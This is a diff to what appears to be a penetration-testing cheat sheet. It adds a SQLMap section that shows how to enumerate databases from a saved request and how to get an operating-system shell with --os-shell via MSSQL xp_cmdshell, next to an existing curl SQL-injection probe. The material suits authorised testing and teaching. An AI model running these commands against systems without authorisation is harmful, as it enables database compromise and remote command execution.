@@ -26,6 +26,17 @@ curl -i 'http://{{RHOST}}:{{RPORT}}/item?id=1%20AND%201=2'
 
 A difference is a lead. Repeat and establish a consistent SQL-dependent result before claiming injection. TODO: verify query context and DBMS before choosing further payloads. [OWASP method](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection/), [request syntax](https://curl.se/docs/manpage.html).
 
+## SQLMap
+
+Save the browser request to req.txt, then enumerate and confirm:
+
+```bash
+sqlmap -r req.txt --dbs --level=3 --risk=2
+sqlmap -r req.txt --os-shell
+```
+
+Higher levels add slower, rarer tests. On MSSQL with stacked queries, `--os-shell` drives [xp_cmdshell](services/databases#mssql-command-execution); match the DBMS from fingerprinting first. [SQLMap usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage), [request file](https://github.com/sqlmapproject/sqlmap/wiki/FAQ#how-can-i-use-a-burpsuite-saved-request-file).
+
 ## Local file inclusion
 
 Adapt the route and file parameter to an observed file-selection feature on a Unix-like target.
